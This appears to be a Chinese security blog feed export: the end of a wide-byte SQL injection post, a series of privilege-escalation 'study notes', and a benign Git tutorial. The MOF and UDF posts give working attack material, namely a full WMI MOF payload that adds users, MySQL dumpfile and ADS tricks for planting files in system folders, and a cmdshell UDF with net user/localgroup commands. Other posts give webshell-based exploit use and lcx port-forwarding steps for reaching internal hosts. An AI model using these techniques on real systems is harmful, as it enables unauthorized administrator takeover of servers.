<h5 id="0×06-总结"><a href="#0×06-总结" class="headerlink" title="0×06 总结"></a>0×06 总结</h5><p>在逐渐国际化的今天，推行 utf-8 编码是大趋势。如果就安全性来说的话，我也觉得使用 utf-8 编码能够避免很多多字节造成的问题。</p>
<p>不光是 gbk，我只是习惯性地把 gbk 作为一个典型的例子在文中与大家说明。世界上的多字节编码有很多，特别是韩国、日本及一些非英语国家的 cms，都可能存在由字符编码造成的安全问题，大家应该有扩展性的思维。</p>
<p>总结一下全文中提到的由字符编码引发的安全问题及其解决方案：</p>
<pre><code>1.gbk 编码造成的宽字符注入问题，解决方法是设置 character_set_client=binary。

2.矫正人们对于 mysql_real_escape_string 的误解，单独调用 `set names gbk` 和mysql_real_escape_string 是无法避免宽字符注入问题的。还得调用 mysql_set_charset 来设置一下字符集。

3.谨慎使用 iconv 来转换字符串编码，很容易出现问题。只要我们把前端 html/js/css 所有编码设置成 gbk，mysql/php 编码设置成 gbk，就不会出现乱码问题。不用画蛇添足地去调用 iconv 转换编码，造成不必要的麻烦。
</code></pre><p>这篇文章是我对于自己白盒审计经验的一点小总结，但自己确实在很多方面存在欠缺，文中所提到的姿势难免存在纰漏和错误，希望有相同爱好的同学能与我指出，共同进步。</p>
<p>这篇文章不像上篇 xss 的，能够举出很多0day实例来论证宽字符造成的危害。原因有二：</p>
<p>宽字符问题确实不如富文本 xss 那么普遍，gbk 编码的 cms 所占的比例也比较小，怪我才疏学浅，并不能每一章都找到相应的实例。</p>
<p>注入的危害比 xss 大得多，如果作为 0day 发出来，影响很坏。但我确实在写文章以及以前的审计过程中找到不少 cms 存在的编码问题。<br>所以我用实验的形式，自己写了的 php 小文件，给大家作为例子，希望不会因为例证的不足，影响大家学习的效果。</p>
<p>例子 php 文件和 sql 文件打包下载：</p>
<p>链接:<a href="http://pan.baidu.com/s/1eQmUArw" target="_blank" rel="external">http://pan.baidu.com/s/1eQmUArw</a> 提取密码:75tu</p>
<p>本文PDF版本：链接: <a href="http://pan.baidu.com/s/1eprLs" target="_blank" rel="external">http://pan.baidu.com/s/1eprLs</a> 密码: yoyw</p>
]]></content>
      
        <categories>
            
            <category> 注入 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 宽字节注入(转载) </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[提权学习(四) MOF提权]]></title>
      <url>/2017/08/14/%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0(%E5%9B%9B)%20MOF%E6%8F%90%E6%9D%83/</url>
      <content type="html"><![CDATA[<h3 id="mof-提权"><a href="#mof-提权" class="headerlink" title="mof 提权"></a>mof 提权</h3><h4 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h4><p><strong><code>mof</code>文件是 <code>Windows 管理规范</code> 存储库中的托管对象格式文件。Windows 管理规范缩写为：WMI</strong></p>
<p><strong><code>Windows 管理规范</code> 提供了三种方式去编译 <code>mof</code> 文件</strong></p>
<pre><code>方法一：运行 Mofcomp.exe 文件，将要编译的 mof 文件作为命令行参数去执行

方法二：使用 IMofCompiler 接口和 $CompileFile 方法

方法三：将 mof 文件拖放到 %SystemRoot%\System32\Webm\MOF 文件夹下，即 C:/Windows/system32/webm/mof 目录 
</code></pre><p><strong>Microsoft 建议到 WMI 存储库编译 <code>mof</code> 文件使用前两种方法，即执行 <code>Mofcomp.exe</code> 文件或者使用 <code>IMofCompiler::CompileFile</code> 方法。第三种方法仅为向后兼容性和早期的 WMI 提供，而且此功能可能不会提供在将来的版本中，所以 Microsoft 不建议使用。</strong></p>
<p><strong>而 <code>mof</code> 提权也恰恰是利用了这第三种方法。在 <code>C:/windows/system32/webm/mof</code> 目录下的 <code>nullevt.mof</code> 文件每分钟都会在一个特定的时间被调用执行一次，所以如果 <code>nullevt.mof</code> 文件被做了修改，在文件中直接写入了添加用户等命令，当 <code>nullevt.mof</code> 被调用执行时，用户就会自动被添加，以达到提权的效果。</strong></p>
<h4 id="0x02-具体流程"><a href="#0x02-具体流程" class="headerlink" title="0x02 具体流程"></a>0x02 具体流程</h4><p><strong>1.寻找可读写目录将我们自己生成的 <code>mof</code> 文件上传到寻找到的可读写目录中，生成的 <code>mof</code> 文件如下</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) instance of __EventFilter as $EventFilter &#123;     EventNamespace = &quot;Root\\Cimv2&quot;;     Name  = &quot;filtP2&quot;;     Query = &quot;Select * From __InstanceModificationEvent &quot;             &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;             &quot;And TargetInstance.Second = 5&quot;;     QueryLanguage = &quot;WQL&quot;; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123;     Name = &quot;consPCSV2&quot;;     ScriptingEngine = &quot;JScript&quot;;     ScriptText =     &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;; &#125;; instance of __FilterToConsumerBinding &#123;     Consumer   = $Consumer;     Filter = $EventFilter; &#125;;</div></pre></td></tr></table></figure>
<p><strong>2.执行 <code>loadfile</code> 及 <code>into dumpfile</code> 把上传到可读写目录，我们已经事先编辑好的 <code>mof</code> 文件导出到 <code>C:/windows/system32/webm/mof</code></strong> </p>
<pre><code>select load_file(&apos;C:\\RECYCLER\\nullevt.mof&apos;) into dumpfile &apos;c:\\windows\\system32\\wbem\\mof\\nullevt.mof&apos;;
</code></pre><p><strong>注意：在执行导出mof文件时，<code>路径</code> 要加双斜杠 <code>\\</code></strong></p>
<h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p><strong>1.导出的 <code>nullevt.mof</code> 会在每分钟的特定时间被调用(可以自己设置)，我们上传的 <code>nullevt.mof</code> 文件代码中有这么一行，该代码的作用就是使该文件在每分钟的第 5 秒的时候被调用执行</strong></p>
<blockquote>
<p>“And TargetInstance.Second = 5”;</p>
</blockquote>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh09mof%E6%8F%90%E6%9D%831.png" alt=""></p>
<p><strong>一旦该文件被调用执行，就会为系统再添加一个用户</strong></p>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh09mof%E6%8F%90%E6%9D%832.png" alt=""></p>
<p><strong>当然用户名和密码都可以自定义，在 nulevt.mof 文件中可以修改用户名和密码的代码如下</strong></p>
<blockquote>
<p>“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe user admin admin /add\”)”;</p>
</blockquote>
<p><strong>我们发现其实在 <code>nulevt.mof</code> 文件中添加用户的语句还是普通的提权添加用户语句，只是把它放在了 nulevt.mof 文件中，当 <code>nulevt.mof</code> 文件 被执行时，添加用户的语句也会被执行。</strong></p>
<p><strong>这个文件被执行完之后只会成功添加一个普通的用户，如果还需要把该用户添加到 <code>administrator</code> 管理员组中的话，只需要把刚刚添加用户的命令修改成把用户添加到管理员组的命令即可，修改完之后再上传导出该文件到 <code>C:/Windows/system32/webm/mof</code> 目录，当该文件被再次执行过后，就会把普通用户添加到 <code>administrator</code> 组中了。</strong></p>
<blockquote>
<p>“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe localgroup administrator admin /add\”)”;</p>
</blockquote>
<h4 id="0x04-解决方法"><a href="#0x04-解决方法" class="headerlink" title="0x04 解决方法"></a>0x04 解决方法</h4><p><strong>将 nullevt.mof 文件导出到 <code>C:/Windows/system32/webm/mof</code> 目录下以后，若是想让系统停止调用执行 <code>nullevt.mof</code> 文件的话，光删除它是不行的，需要如下步骤才可以彻底停止</strong></p>
<ul>
<li><p><strong>1 停止服务</strong></p>
<pre><code>net stop winmgmt
</code></pre></li>
<li><p><strong>2 删除 <code>C:\WINDOWS\system32\wbem\Repository\</code> 文件夹</strong></p>
</li>
<li><p><strong>3 重新启动服务</strong></p>
<pre><code>net start winmgmt
</code></pre><p><strong><code>C:/Windows/system32/webm/mof</code> 文件夹下放的是 <code>Windows 管理规范</code> 的存储库，执行的 <code>.mof</code> 文件都会被加入到这个库中，然后一直会按照我们放入的 <code>nullevt.mof</code> 文件去执行，所以即使删掉了 <code>C:/Windows/system32/webm/mof</code> 目录下的 <code>.mof</code> 文件，系统照样会继续执行，只有停止服务后，把 <code>WMI</code> 的存储库删掉，再重启服务，系统就会重建一个默认的存储库，只有这样才能彻底解决掉这个问题(需要事先把 <code>C:/Windows/system32/webm/mof</code> 目录下的 <code>.mof</code> 文件删掉)</strong></p>
</li>
</ul>
<p>参考文章</p>
<p><a href="https://www.waitalone.cn/mysql-tiquan-summary.html" target="_blank" rel="external">MYSQL提权总结</a></p>
<p><a href="http://www.myhack58.com/Article/html/3/8/2013/38264.htm" target="_blank" rel="external">MOF文件提权</a></p>
]]></content>
      
        <categories>
            
            <category> 提权 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> MOF提权 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[提权学习(三) UDF提权]]></title>
      <url>/2017/08/14/%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0(%E4%B8%89)%20UDF%E6%8F%90%E6%9D%83/</url>
      <content type="html"><![CDATA[<h3 id="UDF-提权"><a href="#UDF-提权" class="headerlink" title="UDF 提权"></a>UDF 提权</h3><h4 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h4><p><strong>利用 <code>root</code> 的高权限来创建能够调用 <code>cmd</code> 的动态链接库 <code>udf.dll</code></strong></p>
<h4 id="0x02-前提条件"><a href="#0x02-前提条件" class="headerlink" title="0x02 前提条件"></a>0x02 前提条件</h4><p><strong>1.判断 MySQL服务 是否存在</strong><br><strong>2.目标系统需要时 Windows(2000/XP/2003)</strong><br><strong>3.需要拥有一个 MySQL 账号，此账号必须拥有对 mysql 的 insert 和 delete 权限以创建和抛弃函数</strong></p>
<h4 id="0x03-具体流程："><a href="#0x03-具体流程：" class="headerlink" title="0x03 具体流程："></a>0x03 具体流程：</h4><h5 id="1-前期工作："><a href="#1-前期工作：" class="headerlink" title="1.前期工作："></a>1.前期工作：</h5><p><strong>对数据库 <code>root</code> 账户的账号密码进行寻找(补充账号密码寻找方法)</strong></p>
<h5 id="2-导出-udf"><a href="#2-导出-udf" class="headerlink" title="2.导出 udf"></a>2.导出 udf</h5><p><strong>判定数据库的版本</strong></p>
<p><strong>(1)如果版本低于 5.1 则为低版本提权，将生成的动态链接库导出到系统盘符：<code>c:\windows\system32</code> 下即可。</strong></p>
<pre><code>当 MySQL 版本在 4.1 以前时，可以将所有 DLL 文件里面的所有函数注册到 MySQL 里面以供 MySQL使用，无论 DLL 在什么位置都可以。

当 MySQL 版本在 4.1-5.0 之间时，MySQL 对 UDF 函数进行了限制，只有实现了一个特定接口的函数才可以被成功注册到 MySQL 中，这样防止了通过 MySQL 非法调用系统的 DLL。

当 MySQL 版本在 5.0-5.1 之间时，对注册的 DLL 的位置进行了限制，在创建函数的时候，所对应的 DLL 路径不能包含 `/` ，即不能是绝对路径。所以将 DLL 文件注册到 system32 目录来跳过此限制；或者放到盘符的更目录下，通过 `c:udf.dll` 这样的形式来绕过限制。但是后来发现只要把 DLL 文件放到 PATH 这个环境变量所记录的任何一个目录下，都和放在 system32 目录下下过一致。

所以，根据以得出结论：只要 MySQL 版本低于 5.1 ，导出 udf.dll 文件的目录可以尽量写在 `c:\windows\system32` 下即可。
</code></pre><p><strong>(2)如果版本大于等于 5.1 则为高版本提权，需要将生成的动态链接库导出到 mysql 安装路径下的 lib\plugin 目录下，但是在 MySQL 中并没有 lib目录，也没有 plugin目录，为了导出成功，则需要使用 SQL 命令创建两个目录，以下命令是查找 MySQL 安装目录，并在安装目录下常见 lib目录 和 plugin目录，这也是解决 <code>Can&#39;t open shared library</code> 问题时的方法</strong></p>
<pre><code>//查找 MySQL 的安装目录
select @@basedir;
//利用 NTFS ADS 创建 lib目录
select &apos;It is dll&apos; into dumpfile &apos;MySQL安装目录\\lib::$INDEX_ALLOCATION&apos;;
//利用 NTFS ADS 创建 plugin目录
select &apos;It is dll&apos; into dumpfile &apos;MySQL安装目录\\lib\\plugin::$INDEX_ALLOCATION&apos;;

lib\plugin 文件夹本来是不存在的，需要先找到 MySQL 的安装路径，并在安装路径下创建 lib\plugin 文件夹，再将 udf.dll 文件导入该文件夹即可
</code></pre><h5 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h5><ul>
<li><strong>具体操作：</strong></li>
</ul>
<p><strong>(1)使用 SQL 语句创建功能函数：<code>create function 函数名(cmdshell) returns string soname &#39;导出的路径&#39;</code></strong></p>
<pre><code>create function cmdshell returns string soname &apos;导出路径&apos;;
</code></pre><p><strong>(2)添加用户的 SQL 语句：<code>select cmdshell(&#39;net user 用户名 用户名密码 /add&#39;);</code></strong></p>
<pre><code>select cmdshell(&apos;net user yzc yzc /add&apos;);
</code></pre><p><strong>(3)将用户添加到管理员组的 SQL 语句：<code>select cmdshell(&#39;net localgroup administrators 用户名 /add&#39;);</code></strong></p>
<pre><code>select cmdshell(&apos;net localgroup administrators yzc /add&apos;);
</code></pre><p>(4)删除函数的 SQL 语句：</p>
<pre><code>drop function cmdshell;
delete from mysql.func where name=&apos;cmdshell&apos;;
</code></pre><ul>
<li><strong>提权方式</strong></li>
</ul>
<p>(1)通过大马自带的 udf 提权功能来提权</p>
<p>(2)利用 udf 提权脚本提权</p>
<p>(3)使用 udf 提权工具进行提权</p>
<pre><code>不推荐使用，因为使用工具的前提是目标站 MySQL服务 具有外联功能，若不具备外联功能工具将无法使用
</code></pre><p>参考文章</p>
<p><a href="http://www.91ri.org/3981.html" target="_blank" rel="external">udf提权方法和出现问题汇总</a></p>
<p><a href="https://www.waitalone.cn/mysql-tiquan-summary.html" target="_blank" rel="external">MYSQL提权总结</a></p>
]]></content>
      
        <categories>
            
            <category> 提权 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> UDF提权 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[提权学习(二) 溢出提权]]></title>
      <url>/2017/08/13/%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0(%E4%BA%8C)%20%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83/</url>
      <content type="html"><![CDATA[<h3 id="溢出提权"><a href="#溢出提权" class="headerlink" title="溢出提权"></a>溢出提权</h3><h4 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h4><p><strong>溢出漏洞就像杯子里装水，水多了杯子装不进去，就会把里面的水溢出来。而相对计算机来说计算机有个地方叫缓存区，程序的缓存区长度是被事先设定好的，如果用户输入的数据超过了这个缓存区的长度，那么这个程序就会溢出了。缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的。</strong></p>
<h4 id="0x02-前提"><a href="#0x02-前提" class="headerlink" title="0x02 前提"></a>0x02 前提</h4><p><strong>1.如果使用 asp 的 webshell 进行提权，则该 webshell 需要支持 wscript(wscript.shell/shell.application)</strong></p>
<p><strong>2.如果使用 aspx 的 webshell 进行提前，则该 webshell 要能够调用 .net 组件来执行 cmd 命令</strong></p>
<h4 id="0x03-提权流程"><a href="#0x03-提权流程" class="headerlink" title="0x03 提权流程"></a>0x03 提权流程</h4><h5 id="1-寻找可读可写目录："><a href="#1-寻找可读可写目录：" class="headerlink" title="1.寻找可读可写目录："></a>1.寻找可读可写目录：</h5><p><strong>该目录的作用是：上传提权的 exp ， cmd.exe 文件 或者 net.exe 文件</strong></p>
<p><strong>注意：寻找到的可读可写目录尽量不要有空格，如果用空格则可能会导致命令无法被执行(尤其是在上传 exp 文件时)</strong></p>
<h5 id="2-主机信息搜集："><a href="#2-主机信息搜集：" class="headerlink" title="2.主机信息搜集："></a>2.主机信息搜集：</h5><p><strong>(1)通过在终端运行 whoami 命令来查看当前用户的权限</strong></p>
<pre><code>whoami
</code></pre><p><strong>(2)通过在终端运行 <code>systeminfo</code> 命令查看主机打补丁的情况</strong></p>
<pre><code>systeminfo
</code></pre><h5 id="3-使用-exp-进行提权"><a href="#3-使用-exp-进行提权" class="headerlink" title="3.使用 exp 进行提权"></a>3.使用 exp 进行提权</h5><p><strong>根据主机打的补丁情况选择合适的 exp 进行提权。将选择好的 exp 上传到一个可读可写的目录下，并把此 exp 路径复制到 webshell 的 cmd 命令栏下。有两类 exp 。</strong></p>
<pre><code>(1)需要在提权过后自己添加新用户并将新用户添加到 administrator 组的 exp ，如：pr/巴西烤肉

(2)不需要手动输入命令，执行了 exp 文件后，直接提权并添加用户等操作，如：ms11080/ms11046
</code></pre><h5 id="4-连接-3389-端口登录远程桌面"><a href="#4-连接-3389-端口登录远程桌面" class="headerlink" title="4.连接 3389 端口登录远程桌面"></a>4.连接 3389 端口登录远程桌面</h5><p><strong>如果无法连接 3389 端口，提权文章中有讲</strong></p>
<h4 id="0x04-添加用户等基本命令"><a href="#0x04-添加用户等基本命令" class="headerlink" title="0x04 添加用户等基本命令"></a>0x04 添加用户等基本命令</h4><h5 id="1-添加用户命令：net-user-用户名-密码-add"><a href="#1-添加用户命令：net-user-用户名-密码-add" class="headerlink" title="1.添加用户命令：net user 用户名 密码 /add"></a>1.添加用户命令：net user 用户名 密码 /add</h5><pre><code>net user yzc yzc /add
</code></pre><h5 id="2-将用户添加到管理员组命令：net-localgroup-administrators-用户-add"><a href="#2-将用户添加到管理员组命令：net-localgroup-administrators-用户-add" class="headerlink" title="2.将用户添加到管理员组命令：net localgroup administrators 用户 /add"></a>2.将用户添加到管理员组命令：net localgroup administrators 用户 /add</h5><pre><code>net localgroup administrators yzc /add
</code></pre><p>参考文章</p>
<p><a href="http://www.cnseay.com/330/" target="_blank" rel="external">常见的服务器溢出提权方法总结</a></p>
]]></content>
      
        <categories>
            
            <category> 提权 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 溢出提权 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[提权学习(一) 提权基础及相关的问题的解决]]></title>
      <url>/2017/08/13/%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0(%E4%B8%80)%20%E6%8F%90%E6%9D%83%E5%9F%BA%E7%A1%80%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%9A%84%E9%97%AE%E9%A2%98%E7%9A%84%E8%A7%A3%E5%86%B3/</url>
      <content type="html"><![CDATA[<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><h4 id="0x01-Windows-常规命令-提权常用"><a href="#0x01-Windows-常规命令-提权常用" class="headerlink" title="0x01 Windows 常规命令(提权常用)"></a>0x01 Windows 常规命令(提权常用)</h4><h5 id="1-查看-IP-地址配置信息"><a href="#1-查看-IP-地址配置信息" class="headerlink" title="1 查看 IP 地址配置信息"></a>1 查看 IP 地址配置信息</h5><pre><code>ipconfig
</code></pre><h5 id="2-用户操作命令-net-user"><a href="#2-用户操作命令-net-user" class="headerlink" title="2 用户操作命令(net user)"></a>2 用户操作命令(net user)</h5><p><strong>(1) 添加用户并设置密码</strong></p>
<pre><code>net user 用户名 用户密码 /add
</code></pre><p><strong>(2) 删除用户</strong></p>
<pre><code>net user 用户 /del
</code></pre><p><strong>(3) 添加用户到管理员组</strong></p>
<pre><code>net localgroup administrators 用户 /add
</code></pre><h5 id="3-网络连接情况命令-netstat"><a href="#3-网络连接情况命令-netstat" class="headerlink" title="3 网络连接情况命令(netstat)"></a>3 网络连接情况命令(netstat)</h5><ul>
<li><p><strong>查看网络连接端口等信息</strong></p>
<pre><code>netstat -ano
</code></pre></li>
</ul>
<h5 id="4-查看当前计算机进程"><a href="#4-查看当前计算机进程" class="headerlink" title="4 查看当前计算机进程"></a>4 查看当前计算机进程</h5><pre><code>tasklist /svc
</code></pre><h5 id="5-查看当前计算机开启服务名称"><a href="#5-查看当前计算机开启服务名称" class="headerlink" title="5 查看当前计算机开启服务名称"></a>5 查看当前计算机开启服务名称</h5><pre><code>net start
</code></pre><h5 id="6-查看计算机信息以及补丁情况"><a href="#6-查看计算机信息以及补丁情况" class="headerlink" title="6 查看计算机信息以及补丁情况"></a>6 查看计算机信息以及补丁情况</h5><pre><code>systeminfo
</code></pre><h5 id="7-查看当前用户权限"><a href="#7-查看当前用户权限" class="headerlink" title="7 查看当前用户权限"></a>7 查看当前用户权限</h5><pre><code>whoami
</code></pre><h5 id="8-查看当前计算机操作系统版本"><a href="#8-查看当前计算机操作系统版本" class="headerlink" title="8 查看当前计算机操作系统版本"></a>8 查看当前计算机操作系统版本</h5><pre><code>ver
</code></pre><h4 id="0x02-提权中遇到的问题："><a href="#0x02-提权中遇到的问题：" class="headerlink" title="0x02 提权中遇到的问题："></a>0x02 提权中遇到的问题：</h4><h5 id="1-cmd无法执行"><a href="#1-cmd无法执行" class="headerlink" title="1.cmd无法执行"></a>1.cmd无法执行</h5><p><strong>原因：(cmd被降权、cmd被删除、组件被删除、防护软件拦截)</strong></p>
<ul>
<li><strong>1 cmd被降权、cmd被删除</strong></li>
</ul>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh06%E6%8F%90%E6%9D%831.png" alt="1"></p>
<p><strong>解决方法：</strong></p>
<pre><code>寻找可读可写目录，重新上传cmd，并调用此cmd执行(cmd被降权、cmd被删除)
注意：尽量不选择带空格的目录
</code></pre><ul>
<li><strong>2 组件被删除</strong></li>
</ul>
<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh06%E6%8F%90%E6%9D%832.png" alt="2"></p>
<p><strong>解决方法：</strong></p>
<pre><code>换用其他组件
</code></pre><h5 id="2-用户无法添加-在权限已经足够添加用户的条件下"><a href="#2-用户无法添加-在权限已经足够添加用户的条件下" class="headerlink" title="2.用户无法添加(在权限已经足够添加用户的条件下)"></a>2.用户无法添加(在权限已经足够添加用户的条件下)</h5><p><strong>原因：net被删除、防护软件拦截</strong></p>
<p><strong>解决方法：</strong></p>
<pre><code>寻找可读可写目录，重新上传net.exe，并调用此net.exe(net被删除)
</code></pre><h5 id="3-3389无法连接"><a href="#3-3389无法连接" class="headerlink" title="3.3389无法连接"></a>3.3389无法连接</h5><p><strong>原因：</strong></p>
<p><strong>(1) 远程访问的服务端口设置的不是3389</strong></p>
<p><strong>解决方法：</strong></p>
<ul>
<li><p><strong>1 PID 查询法</strong></p>
<pre><code>1&apos; 先执行 `tasklist /svc` 命令查看计算机服务进程以及对应的 PID 号(远程访问服务的名称：TermService)

2&apos; 之后执行 `netstat -ano` 查找 PID 对应的端口信息即为被修改过得远程访问服务端口
</code></pre></li>
<li><p><strong>2 注册表读取法</strong></p>
<pre><code>在 WebShell 中有可以直接读取对应端口注册表的选项
</code></pre></li>
<li><p><strong>3 端口扫描法</strong></p>
</li>
</ul>
<p><strong>(2) 远程访问的服务没有开启</strong></p>
<p><strong>解决方法：</strong></p>
<pre><code>尝试打开 3389 端口，开启服务(必须是管理员权限)(有工具可以打开)
</code></pre><p><strong>(3) 内网环境</strong></p>
<p><strong>解决方法：需要用到端口转发，需要准备一台外网服务器以及端口转发工具，外网不能访问内网，但是内网可以访问外网，所以思路就是：让内网将自己3389端口(可能被修改过)的流量转发至外网的一个端口</strong></p>
<p><strong>内网服务器</strong></p>
<pre><code>lcx.exe -slave `外网服务器IP` `端口号1` `内网服务器IP` `远程访问服务的端口号`
</code></pre><p><strong>该命令是指将内网服务器3389端口(可能被修改过)流量转发至外网服务器的指定端口号1端口</strong></p>
<p><strong>外网服务器</strong></p>
<pre><code>lcx.exe -listen `端口号1` `端口号2`
</code></pre><p><strong>该命令是指监听本机的端口号1的流量并将该流量转发至端口号2端口</strong></p>
<p><strong>这样主要在本机连接本地的端口号2端口，就相当于访问了内网服务器的3389端口</strong></p>
<p><strong>(4) 防护软件拦截 </strong></p>
<h4 id="0x03-在菜刀中提权"><a href="#0x03-在菜刀中提权" class="headerlink" title="0x03 在菜刀中提权"></a>0x03 在菜刀中提权</h4><p><strong>如果使用菜刀提权，而目标机器又限制了cmd的命令执行，这时需要寻找可能的可读写目录，上传自己的cmd，之后再虚拟终端执行以下命令修改设置终端路径</strong></p>
<pre><code>setp 上传的 cmd 的路径
</code></pre><h4 id="0x04-注意事项"><a href="#0x04-注意事项" class="headerlink" title="0x04 注意事项"></a>0x04 注意事项</h4><p><strong>(1) 提权可以使用不同的平台进行，如：菜刀、aspx大马</strong></p>
<p><strong>(2) 不同的脚本权限不一样</strong></p>
<pre><code>jsp &gt; aspx &gt; php | asp
</code></pre><p><strong>(3) 在 aspx 脚本中，如果提权不成功，可试着尝试将 <code>cmd 路径</code>换成 <code>exp 路径</code>，将 <code>exp 路径</code> + <code>命令</code>换成 <code>空格</code> + <code>命令</code></strong></p>
]]></content>
      
        <categories>
            
            <category> 提权 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 提权基础 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Git 命令行操作的介绍]]></title>
      <url>/2017/08/05/git%20%E5%91%BD%E4%BB%A4/</url>
      <content type="html"><![CDATA[<h3 id="Git-命令"><a href="#Git-命令" class="headerlink" title="Git 命令"></a>Git 命令</h3><h4 id="0x01-Git-的介绍"><a href="#0x01-Git-的介绍" class="headerlink" title="0x01 Git 的介绍"></a>0x01 Git 的介绍</h4><p><strong>Git 是 Linux 的创始人 Linus Torvalds 开源的一款分布式版本控制系统，以帮助开发者更好的对项目进行版本管理。每一个优秀的开发者在进行项目开发时都会第一时间给自己的项目加上 Git，以便能更好的追踪代码修改，进行版本回溯等操作。在多人协作的开发过程中，Git 更是必不可少的。因此，本书中将使用 Git 来管理项目的所有代码，让你在阅读本书的时候能够体会到 Git 的强大，了解实际开发中我们对 Git 的应用。</strong></p>
<p><strong>在现代化的项目开发中，Git 基本上是标配。</strong></p>
<h4 id="0x02-Git-命令的介绍"><a href="#0x02-Git-命令的介绍" class="headerlink" title="0x02 Git 命令的介绍"></a>0x02 Git 命令的介绍</h4><h5 id="1-Git-的基本设置"><a href="#1-Git-的基本设置" class="headerlink" title="1.Git 的基本设置"></a>1.Git 的基本设置</h5><pre><code>git config --global user.name &quot;Your name&quot;
git config --global user.email you@example.com
</code></pre><p><strong>–global 是对 Git 进行全局设置</strong></p>
<p><strong>该命令是对 Git 进行用户名和邮箱的设置，该设置可以在你提交代码时自动署名标记，方便查看提交日志是区分作者。</strong></p>
<h5 id="2-Git-推送分支设置"><a href="#2-Git-推送分支设置" class="headerlink" title="2.Git 推送分支设置"></a>2.Git 推送分支设置</h5><pre><code>git config --global push.default simple
</code></pre><p><strong>此命令的作用是：当我们执行 <code>git push</code> 命令，但是没有指定分支时，会自动使用当前分支，而不是报错</strong></p>
<h5 id="3-Git-初始化"><a href="#3-Git-初始化" class="headerlink" title="3.Git 初始化"></a>3.Git 初始化</h5><pre><code>git init
</code></pre><h5 id="4-添加版本管理"><a href="#4-添加版本管理" class="headerlink" title="4.添加版本管理"></a>4.添加版本管理</h5><pre><code>git add -A
</code></pre><p><strong>可以通过在 <code>.gitignore</code> 文件中进行设置，来忽略掉一些我们不想纳入到 Git 版本管理中的文件(如缓存文件) 因此上面描述的『所有文件』指的是没在 <code>.gitignore</code> 中被忽略的文件。</strong></p>
<h5 id="5-检查-Git-状态"><a href="#5-检查-Git-状态" class="headerlink" title="5.检查 Git 状态"></a>5.检查 Git 状态</h5><pre><code>git status
</code></pre><p><strong>该命令会向你输出存放在 Git 暂存区中的文件，这意味着这些文件并没有真正提交到 Git 中。</strong></p>
<h5 id="6-保留改动并提交"><a href="#6-保留改动并提交" class="headerlink" title="6.保留改动并提交"></a>6.保留改动并提交</h5><pre><code>git commit -m &quot;Initial commit&quot;
</code></pre><p><strong>该命令会将暂存区的文件都提交到 Git，<code>-m</code> 选项后面带的参数表示本次提交的简单描述。</strong></p>
<h5 id="7-查看历史提交记录"><a href="#7-查看历史提交记录" class="headerlink" title="7.查看历史提交记录"></a>7.查看历史提交记录</h5><pre><code>git log
</code></pre><p><strong>从输出信息中可以很清晰的看到每次提交的作者、日期、描述等信息。注意看这里的 <code>Author</code> 项的内容就是我们上面设置的用户信息。 按 <code>q</code> 可退出查看。</strong></p>
<h5 id="8-恢复被删除文件"><a href="#8-恢复被删除文件" class="headerlink" title="8.恢复被删除文件"></a>8.恢复被删除文件</h5><pre><code>git checkout -f
</code></pre><p>该命令的作用是将在暂存区里更改的文件进行强制撤销</p>
<h5 id="9-新建分支"><a href="#9-新建分支" class="headerlink" title="9.新建分支"></a>9.新建分支</h5><p><strong>(1)新建 static-pages 分支</strong></p>
<pre><code>git checkout master
git checkout -b static-pages
</code></pre><p><strong>上面的第一条命令 git checkout master 代表将当前分支切换到 master 分支上，master 分支是我们初始化 Git 时默认创建的主分支，其它分支都是基于主分支衍生出来的。</strong></p>
<p><strong>第二条命令 git checkout -b static-pages 将会为你创建一个名为 static-pages 的新分支。-b 选项表示创建指定名称的新分支。</strong></p>
<p><strong>你可以将新建的 static-pages 理解为是对 master 分支的克隆，在上面做的所有修改都不会影响到 master 分支。本节后面会将 static-pages 分支合并到 master 分支上，合并成功之后，在 static-pages 分支上做的所有改动都会并入到 master 分支。另外，你也可以选择对一个分支进行删除操作，当一个分支被删除之后，在该分支之上的所有改动也都将被销毁，删除分支的操作不会影响到 master 分支。这便是 Git 工作流的强大之处。</strong></p>
<p><strong>(2)合并分支</strong></p>
<pre><code>git merge fake-branch
</code></pre><p><strong>(3)删除分支</strong></p>
<pre><code>git branch -d fake-branch
